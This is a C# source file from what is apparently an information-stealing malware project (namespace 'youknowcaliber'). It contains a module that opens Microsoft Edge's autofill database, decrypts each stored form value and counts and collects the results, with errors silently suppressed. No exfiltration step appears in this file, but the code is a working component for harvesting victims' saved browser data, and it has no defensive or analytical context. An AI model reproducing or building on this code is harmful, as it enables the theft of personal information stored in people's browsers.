using System.Collections.Generic;

namespace youknowcaliber.Edge
{
    internal sealed class Autofill
    {
        /// <summary>
        /// Get Autofill values from edge browser
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with autofill</returns>
        public static List<AutoFill> Get(string sWebData)
        {
            List<AutoFill> acAutoFillData = new List<AutoFill>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sWebData, "autofill");
                if (sSQLite == null) return acAutoFillData;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    AutoFill aFill = new AutoFill();

                    aFill.sName = Chromium.Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    aFill.sValue = Chromium.Crypto.GetUTF8(Chromium.Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 2)));

                    Counting.AutoFill++;
                    acAutoFillData.Add(aFill);

                }
            }
            catch{ }
            return acAutoFillData;
        }
    }
}
